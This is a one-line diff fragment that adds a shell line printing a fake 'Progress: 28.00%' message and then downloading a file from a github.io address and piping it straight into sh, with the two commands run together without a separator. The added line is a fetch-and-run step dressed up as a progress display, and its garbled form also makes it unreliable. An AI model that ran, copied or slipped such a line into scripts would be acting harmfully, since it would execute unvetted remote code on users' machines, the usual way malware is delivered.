@@ -1,0 +1,1 @@
+echo Progress: 28.00%curl -L --progress-bar frkns.github.io/fun/IMPOSED_OUTSIDE_FLOOR.hush-login | sh
